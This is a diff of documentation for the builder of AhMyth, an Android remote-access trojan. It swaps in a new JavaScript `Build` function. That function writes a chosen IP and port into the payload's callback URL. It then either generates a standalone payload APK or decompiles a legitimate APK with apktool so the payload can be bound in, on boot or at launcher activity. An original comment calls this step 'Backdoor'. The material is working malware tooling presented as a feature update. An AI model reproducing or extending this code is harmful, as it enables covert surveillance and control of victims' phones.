@@ -362,108 +362,89 @@ $appCtrl.BindOnLauncher = (apkFolder) => {
 
 ## Updated `Build` function
 ```js
-    $appCtrl.Build = (ip, port) => {
-        
-        if (!ip) {
-            $appCtrl.Log('[x] IP Address Cannot Be Empty.', CONSTANTS.logStatus.FAIL);
-            return;
-        }
-        
-        if (!port) {
-            port = CONSTANTS.defaultPort;
-        }
-        
-        if (port > 65535 || port <= 1024) {
-            $appCtrl.Log('[x] Choose ports from range (1024 - 65535)', CONSTANTS.logStatus.FAIL);
-            return;
-        }
-    
-    
-        /* Opens the ahmyth payload source file and modifiies the ip and port to the users' ones for a standalone payload. */
-        if (!$appCtrl.bindApk.enable) {
-            var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
-        }
-        
-        /* Opens the ahmyth payload source file and modifiies the ip and port to the users' ones for a bound payload. */
-        if ($appCtrl.bindApk.enable) {
-            var ipPortFile = dir.join(CONSTANTS.vaultFolderPath, CONSTANTS.IOSocketPath);
-        }
-    
-        delayedLog('[★] Reading (IP:PORT) File From ' + CONSTANTS.apkSourceName + dir.sep + IOSocketPath);
-    
-        fs.readFile(ipPortFile, 'utf8', (error, data) => {
-            if (error) {
-                delayedLog('[x] Reading (IP:PORT) File Failed!', CONSTANTS.logStatus.FAIL);
-    
-                fs.mkdir(logPath);
-                fs.writeFile(dir.join(logPath, 'IP-PORT.log'), `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
-    
-                delayedLog('Error written to "IP:PORT.log" on...', CONSTANTS.logStatus.INFO)
-                delayedLog(logPath, CONSTANTS.logStatus.INFO);
-                return;
-            }
-    
-            /* Only shows the ipPortFile path from 'CONSTANTS.IOSocketPath', not the full path */
-            var ipPortFilePath = CONSTANTS.IOSocketPath.split().pop(".smali")
-            delayedLog('[★] Adding Source IP:PORT to ' + CONSTANTS.apkSourceName + '/' + ipPortFilePath + '...');
-    
-            var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + ip + ":" + port);
-            fs.writeFile(ipPortFile, result, 'utf8', (error) => {
-                if (error) {
-                    delayedLog('[x] Adding Source IP:PORT Failed', CONSTANTS.logStatus.FAIL);
-    
-                    fs.mkdir(logPath);
-                    fs.writeFile(dir.join(logPath, 'IP:PORT.log'), `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
-    
-                    delayedLog('[¡] Error written to "IP:PORT.log" on...', CONSTANTS.logStatus.INFO)
-                    delayedLog('[¡] ' + logPath, CONSTANTS.logStatus.INFO);
-                    return;
-                }
-    
-                /* check if the Binding Feature has been enabled, if it hasn't, the function will build a standalone APK Payload */
-                if (!$appCtrl.bindApk.enable) {
-                    $appCtrl.GenerateApk(CONSTANTS.ahmythApkFolderPath);
-                } else {
-                    /* Otherwise the function will Decompile, Backdoor & Regenerate an Original APK */
-                    
-                    var filePath = $appCtrl.filePath;
-                    if (filePath == null) {
-                        delayedLog('[x] Browse for the Original APK you Want to Temaplate!', CONSTANTS.logStatus.FAIL);
-                        return;
-                    } else if (!filePath.includes(".apk")) {
-                        delayedLog('[x] Sorry, but This is not an APK file', CONSTANTS.logStatus.FAIL);
-                        return;
-                    }
-    
-    
-                    var apkFolder = filePath.substring(0, filePath.indexOf(".apk"));
-                    delayedLog('[★] Decompiling ' + '"' + filePath.replace(/\\/g, "/").split("/").pop() + '"' + "...");
-    
-                    var decompileApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" d "' + filePath + '" -f -o "' + apkFolder + '"',
-                        (error, stdout, stderr) => {
-                            if (error !== null) {
-                                delayedLog('[x] Decompiling Failed!', CONSTANTS.logStatus.FAIL);
-    
-                                fs.mkdir(logPath);
-                                fs.writeFile(dir.join(logPath, 'Decompiling.log'), `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
-    
-                                delayedLog('[¡] Decompiling Error written to "Decompiling.log" on...', CONSTANTS.logStatus.INFO)
-                                delayedLog('[¡] ' + logPath, CONSTANTS.logStatus.INFO);
-                                return;
-                            }
-    
-                            if ($appCtrl.bindApk.method == 'BOOT')
-                                $appCtrl.BindOnBoot(apkFolder);
-    
-                            else if ($appCtrl.bindApk.method == 'ACTIVITY')
-                                $appCtrl.BindOnLauncher(apkFolder);
-    
-    
-                        });
-                }
-            });
-        });
+  $appCtrl.Build = (ip, port) => {
+    if (!ip) {
+      $appCtrl.Log('[x] ' + 'IP Address Cannot Be Empty.', CONSTANTS.logStatus.FAIL);
+      return;
     }
+    if (!port) {
+      port = CONSTANTS.defaultPort;
+    }
+    if (port > 65535 || port <= 1024) {
+      $appCtrl.Log('[x] ' + 'Choose ports from range (1024 - 65535)', CONSTANTS.logStatus.FAIL);
+      return;
+    }
+
+
+    // open ahmyth source file and modifiy the ip and port to the users' ones
+    var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
+    delayedLog('[★] ' + 'Reading (IP:PORT) file from ' + CONSTANTS.apkSourceName + '...');
+
+    fs.readFile(ipPortFile, 'utf8', (error, data) => {
+      if (error) {
+        $appCtrl.Log('[x] ' + 'Reading (ip:port) file Failed', CONSTANTS.logStatus.FAIL);
+        WriteErrorLog(error, 'IP-PORT.log')
+        $appCtrl.Log('[¡] ' + 'Error written to "IP-PORT.log" on...', CONSTANTS.logStatus.INFO)
+        $appCtrl.Log(logPath, CONSTANTS.logStatus.INFO);
+        return;
+      }
+
+      delayedLog('[★] ' + 'Adding source ip:port to ' + CONSTANTS.apkSourceName + '...');
+
+      // only show the ipPortFile path from CONSTANTS.IOSocketPath, not the full path
+      var ipPortFilePath = CONSTANTS.IOSocketPath.split().pop(".smali")
+      delayedLog('[★] ' + 'Adding source ip:port to ' + ipPortFilePath + '...');
+
+      var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + ip + ":" + port);
+      fs.writeFile(ipPortFile, result, 'utf8', (error) => {
+        if (error) {
+          $appCtrl.Log('[x] ' + 'Adding source ip:port Failed', CONSTANTS.logStatus.FAIL);
+          WriteErrorLog(error, 'IP-PORT.log')
+          $appCtrl.Log('[¡] ' + 'Error written to "IP-PORT.log" on...', CONSTANTS.logStatus.INFO)
+          $appCtrl.Log(logPath, CONSTANTS.logStatus.INFO);
+          return;
+        }
+
+        // check if bind apk is enabled
+        if (!$appCtrl.bindApk.enable) {
+          $appCtrl.GenerateApk(CONSTANTS.ahmythApkFolderPath);
+        } else {
+          // generate a solid ahmyth apk
+          var filePath = $appCtrl.filePath;
+          if (filePath == null) {
+            $appCtrl.Log('[x] ' + 'Browse for the Original APK you Want to Bind With', CONSTANTS.logStatus.FAIL);
+            return;
+          } else if (!filePath.includes(".apk")) {
+            $appCtrl.Log('[x] ' + 'Sorry! This is not an APK file', CONSTANTS.logStatus.FAIL);
+            return;
+          }
+
+
+          var apkFolder = filePath.substring(0, filePath.indexOf(".apk"));
+          delayedLog('[★] ' + 'Decompiling ' + '"' + filePath.replace(/\\/g, "/").split("/").pop() + '"' + "...");
+
+          var decompileApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" d "' + filePath + '" -f -o "' + apkFolder + '"',
+            (error, stdout, stderr) => {
+              if (error !== null) {
+                $appCtrl.Log('[x] ' + 'Decompiling Failed!', CONSTANTS.logStatus.FAIL);
+                WriteErrorLog(error, 'Decompiling.log')
+                $appCtrl.Log('[¡] ' + 'Decompiling Error written to "Decompiling.log" on...', CONSTANTS.logStatus.INFO)
+                $appCtrl.Log(logPath, CONSTANTS.logStatus.INFO);
+                return;
+              }
+
+              if ($appCtrl.bindApk.method == 'BOOT')
+                $appCtrl.BindOnBoot(apkFolder);
+
+              else if ($appCtrl.bindApk.method == 'ACTIVITY')
+                $appCtrl.BindOnLauncher(apkFolder);
+
+
+            });
+        }
+      });
+    });
+  }
 
 
 
